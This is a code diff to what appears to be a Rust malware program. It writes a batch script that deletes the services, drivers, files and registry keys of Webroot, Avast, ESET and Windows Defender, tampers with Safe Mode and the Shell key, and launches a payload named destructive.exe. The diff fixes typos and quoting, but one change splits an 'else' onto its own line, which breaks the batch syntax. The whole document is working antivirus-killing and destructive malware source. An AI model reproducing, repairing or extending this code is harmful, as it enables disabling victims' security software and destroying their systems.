@@ -124,14 +124,15 @@ fn modify_registry() -> io::Result<()> {
 }
 
 fn create_batch_file() -> io::Result<()> {
-    // Create a batch file to clean up Safe Mode and schedule desturctive.exe
+    // Create a batch file to clean up Safe Mode and schedule destructive.exe
     let batch_content = r#"
 @echo off
 :: Check if we are in Safe Mode by examining the current boot entry
 bcdedit /enum {current} | findstr /i "safeboot"
 if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
-) else (
+) 
+else (
     echo Safe Mode is not enabled
     "C:\Program Files\utkudrk2\destructive.exe"
     exit
@@ -155,7 +156,7 @@ sc delete WRCoreService
 sc delete WRSVC
 del /f "C:\windows\system32\drivers\wrkrn.sys" :: https://www.reddit.com/r/msp/comments/uu7cy6/webroot_secureanywhere_uninstall_issue/
 del /f "C:\windows\system32\wruser.dll"
-del /f "C:\program files\webroot\*.*
+del /f "C:\program files\webroot\*.*"
 del /f "C:\Program Files (x86)\Webroot\*.*"
 del /f "C:\ProgramData\WRCore\*.*"
 del /f "C:\ProgramData\WRData\*.*"
@@ -193,11 +194,11 @@ reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
 :: Webroot
 reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f
-reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f
-reg Delete "HKLM\SOFTWARE\WRData" /f
-reg Delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f
-reg Delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f
-reg Delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f
+reg delete "HKLM\SOFTWARE\WRData" /f
+reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f
+reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f
 :: Windows Defender
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
@@ -225,7 +226,7 @@ reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f
 
 :: Confirm completion
-echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.
+echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
 
 :: Run the destructive.exe
 "C:\Program Files\utkudrk2\destructive.exe"
